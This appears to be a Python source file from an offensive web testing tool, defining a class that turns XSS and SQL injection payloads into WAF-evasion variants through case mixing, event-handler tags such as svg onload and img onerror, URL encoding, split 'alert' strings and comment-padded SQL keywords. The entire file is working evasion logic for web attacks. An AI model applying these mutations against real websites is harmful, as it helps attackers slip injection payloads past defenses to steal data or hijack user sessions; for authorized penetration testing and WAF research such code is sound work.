from __future__ import annotations

import urllib.parse


class PayloadMutator:
    """Generates WAF-bypass variants for standard payloads."""

    @staticmethod
    def mutate_xss(payload: str) -> list:
        if "<script>" not in payload:
            return [payload]

        mutations = [
            payload.replace("<script>", "<ScRiPt>"),
            payload.replace("<script>", "<svg/onload="),
            payload.replace("<script>", "<img src=x onerror="),
            payload.replace("<script>", "<script "),
            urllib.parse.quote(payload),
            payload.replace("alert", "top['al'+'ert']"),
        ]
        return [item for item in mutations if item]

    @staticmethod
    def mutate_sqli(payload: str) -> list:
        mutations = [
            payload.replace("UNION", "UN/**/ION"),
            payload.replace(" ", "/**/"),
            payload.replace("'", "%27"),
            payload.replace("SELECT", "SeLeCt"),
            payload + "-- -",
        ]
        return [item for item in mutations if item]
